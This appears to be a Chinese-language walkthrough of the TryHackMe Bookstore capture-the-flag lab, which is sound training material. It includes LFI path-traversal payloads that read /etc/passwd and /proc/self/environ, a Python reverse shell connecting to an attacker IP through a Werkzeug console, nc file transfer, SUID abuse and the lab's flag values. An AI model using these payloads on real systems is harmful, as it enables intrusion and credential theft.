# THM Bookstore 渗透测试 Writeup

**日期**: 2026-05-27
**目标**: 10.49.136.62 (TryHackMe Bookstore)
**授权**: THM 授权靶场，全 IP 范围，无限制

---

## 攻击链概览

```
信息搜集 → Web枚举 → API分析 → v1 LFI → 环境变量泄露 → PIN码获取 → Console RCE → sid shell → 逆向工程 → try-harder提权 → root
```

---

## 1. 信息搜集

### 端口扫描
```bash
nmap -sV -sC -p- --min-rate 1000 10.49.136.62
```

**开放端口：**
| 端口     | 服务 | 版本                           |
| -------- | ---- | ------------------------------ |
| 22/tcp   | SSH  | OpenSSH 7.6p1 Ubuntu           |
| 80/tcp   | HTTP | Apache httpd 2.4.29            |
| 5000/tcp | HTTP | Werkzeug 0.14.1 (Python 3.6.9) |

---

## 2. Web 枚举

### 目录扫描
```bash
gobuster dir -u http://10.49.136.62:5000 -w /usr/share/wordlists/dirb/common.txt -t 50
```

**发现：**
- `/api` (200) — API 文档
- `/console` (200) — Werkzeug Debug Console
- `/robots.txt` (200) — 禁止 `/api`

### API 文档分析
```bash
curl -s http://10.49.136.62:5000/api
```

**v2 API 端点：**
- `/api/v2/resources/books/all`
- `/api/v2/resources/books/random4`
- `/api/v2/resources/books?id=1`
- `/api/v2/resources/books?author=xxx`
- `/api/v2/resources/books?published=xxx`

**关键发现：v1 API 也存在！**

---

## 3. v1 API LFI 漏洞

### 发现过程
将 v2 端点改为 v1 测试：
```bash
curl "http://10.49.136.62:5000/api/v1/resources/books?show=../../etc/passwd"
```

**成功读取 /etc/passwd！**

### 利用 LFI 读取关键文件
```bash
# 读取用户 flag
curl "http://10.49.136.62:5000/api/v1/resources/books?show=../../home/sid/user.txt"

# 读取环境变量（获取 Werkzeug PIN）
curl "http://10.49.136.62:5000/api/v1/resources/books?show=../../proc/self/environ"

# 读取应用路径
curl "http://10.49.136.62:5000/api/v1/resources/books?show=../../proc/self/cmdline"
```

**关键信息：**
| 信息                   | 值                                   |
| ---------------------- | ------------------------------------ |
| machine-id             | d86a656616e9492d93f4ab7905f44292     |
| boot_id                | 79c09d74-eebd-4b3d-82dc-f9d77e2f2f07 |
| 应用路径               | /home/sid/api.py                     |
| 运行用户               | sid                                  |
| **WERKZEUG_DEBUG_PIN** | **123-321-135**                      |

---

## 4. Werkzeug Console RCE

### 解锁 Console
访问 `http://10.49.136.62:5000/console`，输入 PIN: `123-321-135`

### 获取反向 shell
在 Kali 监听：
```bash
nc -lvnp 1234
```

在 Console 执行：
```python
import socket,subprocess,os
s=socket.socket()
s.connect(("192.168.241.203",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

**成功获取 sid shell！**

---

## 5. 提权 - try-harder

### 发现 SUID 文件
```bash
find / -perm -u=s -type f 2>/dev/null
```

**异常发现：/home/sid/try-harder**

### 文件分析
```bash
file /home/sid/try-harder
# setuid, setgid ELF 64-bit

strings /home/sid/try-harder
# "What's The Magic Number?!"
# "/bin/bash -p"
# "Incorrect Try Harder"
```

### 逆向工程
拉取到 Kali 分析：
```bash
# 靶机发送文件
nc -w 3 192.168.241.203 5555 < /home/sid/try-harder

# Kali 接收
nc -lvnp 5555 > try-harder
```

objdump 分析：
```bash
objdump -d try-harder | grep -A 60 '<main>:'
```

**关键汇编代码：**
```
7cb: movl $0x5db3,-0x10(%rbp)          ; 存储 0x5db3 (23987)
7f9: xor $0x1116,%eax                  ; 输入 ^= 0x1116
804: xor %eax,-0xc(%rbp)               ; 结果 ^= 0x5db3
807: cmpl $0x5dcd21f4,-0xc(%rbp)       ; 比较 0x5dcd21f4
80e: jne 823                            ; 不相等则失败
81c: call 660 <system@plt>             ; 执行 system("/bin/bash -p")
```

### 计算 Magic Number
算法：`(input ^ 0x1116) ^ 0x5db3 == 0x5dcd21f4`

```python
input = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3
input = 1573743953
```

### 验证并提权
```bash
/home/sid/try-harder
# 输入: 1573743953
```

**成功获取 root shell！**

---

## 6. 获取 Flags

### User Flag
```bash
cat /home/sid/user.txt
# 4ea65eb80ed441adb68246ddf7b964ab
```

### Root Flag
```bash
cat /root/root.txt
# e29b05fba5b2a7e69c24a450893158e3
```

---

## 技术总结

### 发现的漏洞
1. **LFI 路径遍历** (严重): v1 API 的 `show` 参数未过滤 `../../`
2. **环境变量泄露** (严重): Flask debug PIN 码暴露在 `/proc/self/environ`
3. **Werkzeug Console RCE** (严重): 使用泄露 PIN 解锁交互式控制台
4. **SUID 逆向挑战** (高危): try-harder 程序存在可破解的 magic number

### 权限提升路径
```
LFI (www-data) → 读取 /proc/self/environ → 获取 Werkzeug PIN → Console RCE → sid shell → try-harder 逆向 → root
```

### 关键命令
```bash
# LFI 读取文件
curl "http://10.49.136.62:5000/api/v1/resources/books?show=../../etc/passwd"

# 获取 PIN 码
curl "http://10.49.136.62:5000/api/v1/resources/books?show=../../proc/self/environ"

# Console 反向 shell
import socket,subprocess,os
s=socket.socket(); s.connect(("192.168.241.203",1234))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])

# 提权
echo 1573743953 | /home/sid/try-harder
```
